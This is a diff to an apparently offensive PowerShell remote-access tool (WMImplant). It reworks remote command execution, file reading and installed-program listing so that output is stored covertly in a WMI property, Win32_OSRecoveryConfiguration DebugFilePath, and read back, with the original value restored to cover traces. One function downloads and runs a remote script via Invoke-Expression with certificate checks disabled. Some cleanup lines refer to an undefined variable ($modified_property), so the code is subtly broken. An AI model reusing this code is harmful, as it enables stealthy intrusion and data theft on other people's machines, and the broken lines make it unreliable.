@@ -465,9 +465,12 @@ function Get-InstalledPrograms
             $Target = $Target.Trim()
         }
 
+        # Store data in existing WMI property, but keep original value
+        $Original_WMIProperty = (Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+
         # On remote system, save file to registry
         Write-Verbose "Running remote command and writing on remote registry"
-        $remote_command = '$fct = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string; $fctenc=[Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
+        $remote_command = '$fct = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string; $fctenc=[Int[]][Char[]]$fct -Join '',''; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
 
         if($Creds)
         {
@@ -482,32 +485,20 @@ function Get-InstalledPrograms
         Start-Sleep -s 15
 
         # Grab file from remote system's registry
-        Write-Verbose "Reading info from remote registry"
+        Write-Verbose "Reading info from remote WMI Property"
 
-        if($Creds)
-        {
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
     
-        $decode = [char[]][int[]]$remote_reg.sValue.Split(',') -Join ''
+        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
 
-        # Removing Registry value from remote system
-        Write-Verbose "Removing registry value from remote system"
+        # Replacing original WMI property value from remote system
+        Write-Verbose "Replacing original WMI property value from remote system"
 
-        if($Creds)
-        {
-            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_property.DebugFilePath = $Original_WMIProperty
+        $modified_property.Put()
+        
         Write-Verbose "Done!"
     }
     end{}
@@ -688,27 +679,17 @@ function Invoke-CommandExecution
             $ExecCommand = Read-Host "Please provide the command you'd like to run >"
         }
 
-        # setting variables for registry storage
-        #hklm = 2147483650
-        #hkcu = 2147483649
-        #hkcr = 2147483648
-        #hkusers = 2147483651
-        #hkcurrentconfig = 2147483653
-        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
-        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-        # The reghive value is for hkey_local_machine
-        $reghive = 2147483650
-        $regpath = "SOFTWARE\Microsoft\Windows"
         $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+
+        # Get original WMI Property
+        $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
 
         Write-Verbose "Building PowerShell command"
 
-        $encoded_command = '$output = '
-        $encoded_command += "$ExecCommand;"
-        $encoded_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
-        $encoded_command += ' New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $EncodedText -PropertyType String -Force'
-
-        $remote_command = $encoded_command
+        $remote_command = '$output = '
+        $remote_command += "$ExecCommand;"
+        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
+        $remote_command += ' $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'
 
         Write-Verbose "Running command on remote system..."
 
@@ -721,34 +702,21 @@ function Invoke-CommandExecution
             Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
-        # Grab file from remote system's registry
-        Write-Verbose "Sleeping, and then reading file from remote registry"
+        # Grab output from remote system
+        Write-Verbose "Sleeping, and then reading output from remote WMI Property"
         Start-Sleep -s 30
 
-        if($Creds)
-        {   
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
 
-        $decode = [char[]][int[]]$remote_reg.sValue.Split(',') -Join ''
+        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
 
-        # Removing Registry value from remote system
-        Write-Verbose "Removing registry value from remote system"
+        # Replacing WMI Property
+        Write-Verbose "Replacing WMI Property"
 
-        if($Creds)
-        {
-            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
+        $modified_WMIObject.Put()
 
         Write-Verbose "Done!"
     }
@@ -1887,29 +1855,18 @@ function Invoke-RemoteScriptWithOutput
             $Function = $Function.Trim()
         }
 
-        # setting variables for registry storage
-        #hklm = 2147483650
-        #hkcu = 2147483649
-        #hkcr = 2147483648
-        #hkusers = 2147483651
-        #hkcurrentconfig = 2147483653
-        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
-        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-        # The reghive value is for hkey_local_machine
-        $reghive = 2147483650
-        $regpath = "SOFTWARE\Microsoft\Windows"
         $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+        # Saving original WMI Property value
+        $Original_WMIProperty = (Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
 
         Write-Verbose "Building PowerShell command"
 
-        $Command = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
-        $Command += "'$Url'"
-        $Command += ')); $output = '
-        $Command += "$Function;"
-        $Command += ' $bytes = [System.Text.Encoding]::Ascii.GetBytes($output); $EncodedText = [Convert]::ToBase64String($bytes);'
-        $Command += ' New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $EncodedText -PropertyType String -Force'
-
-        $remote_command = $Command
+        $remote_command = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
+        $remote_command += "'$Url'"
+        $remote_command += ')); $output = '
+        $remote_command += "$Function;"
+        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
+        $remote_command += ' $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'
 
         Write-Verbose "Running command on remote system..."
 
@@ -1926,31 +1883,16 @@ function Invoke-RemoteScriptWithOutput
         Write-Verbose "Sleeping, and then reading file from remote registry"
         Start-Sleep -s 30
 
-        if($Creds)
-        {   
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
 
-        $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
+        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
-        $enc = [System.Text.Encoding]::ASCII
-        $enc.GetString($decode)
+        $decode
 
         # Removing Registry value from remote system
         Write-Verbose "Removing registry value from remote system"
-
-        if($Creds)
-        {
-            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_property.DebugFilePath = $Original_WMIProperty
+        $modified_property.Put()
 
         Write-Verbose "Done!"
     }
@@ -3958,11 +3900,7 @@ function Get-FileContentsWMImplant
 
     Process
     {
-        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
-        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-        # The reghive value is for hkey_local_machine
-        $reghive = 2147483650
-        $regpath = "SOFTWARE\Microsoft\Windows"
+
         $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
 
         if(!$Target)
@@ -3977,9 +3915,12 @@ function Get-FileContentsWMImplant
             $File = $File.Trim()
         }
 
+        # Keep original WMI Property Value
+        $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+
         # On remote system, save file to registry
         Write-Verbose "Reading remote file and writing on remote registry"
-        $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
+        $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
 
         if($Creds)
         {
@@ -3993,33 +3934,21 @@ function Get-FileContentsWMImplant
         Write-Verbose "Sleeping to let remote system read and store file"
         Start-Sleep -s 30
 
-        # Grab file from remote system's registry
-        Write-Verbose "Reading file from remote registry"
+        # Grab file from remote system
+        Write-Verbose "Reading file from remote system"
 
-        if($Creds)
-        {
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
 
-        $decode =  [char[]][int[]]$remote_reg.sValue.Split(',') -Join ''
+        $decode =  [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
 
         # Removing Registry value from remote system
         Write-Verbose "Removing registry value from remote system"
 
-        if($Creds)
-        {
-            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
-        }
+        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
+        $modified_WMIObject.Put()
+
         Write-Verbose "Done!"
     }
     end{}
